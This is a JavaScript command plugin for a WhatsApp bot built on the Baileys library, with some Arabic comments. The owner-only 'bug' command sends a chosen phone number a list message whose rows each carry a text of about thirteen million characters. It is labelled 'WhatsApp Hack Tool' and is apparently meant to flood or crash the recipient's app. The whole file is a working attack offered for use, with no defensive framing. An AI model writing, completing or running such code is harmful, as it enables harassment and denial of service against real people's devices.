import pkg from '@whiskeysockets/baileys';
const { default: makeWASocket, useSingleFileAuthState } = pkg;

const { state, saveState } = useSingleFileAuthState('./auth_info.json');

let handler = async (m, { conn, args, usedPrefix, command }) => {
    let phoneNumber = args[0];
    let messageCount = parseInt(args[1]);
    let message = "jeen ai hack ".repeat(1000000);

    if (!phoneNumber || isNaN(messageCount)) {
        m.reply(`Usage: ${usedPrefix}${command} <phoneNumber> <messageCount>`);
        return;
    }

    let sock = conn || makeWASocket({
        auth: state,
        printQRInTerminal: true
    });

    sock.ev.on('creds.update', saveState);

    // إنشاء عناصر القائمة
    let rows = [];
    for (let i = 0; i < messageCount; i++) {
        rows.push({
            title: `Message ${i + 1}`,
            rowId: `message-${i + 1}`,
            description: message
        });
    }

    const sections = [{
        title: "Hack Messages",
        rows: rows
    }];

    const listMessage = {
        text: `Sending ${messageCount} messages to ${phoneNumber}`,
        footer: 'Automated Message',
        title: "WhatsApp Hack Tool",
        buttonText: "Send Messages",
        sections: sections
    };

    // إرسال القائمة
    await sock.sendMessage(`${phoneNumber}@s.whatsapp.net`, { listMessage });

    m.reply(`Successfully sent ${messageCount} messages as a list to ${phoneNumber}!`);
};

handler.command = /^(bug)$/i;
handler.owner = true;

export default handler;
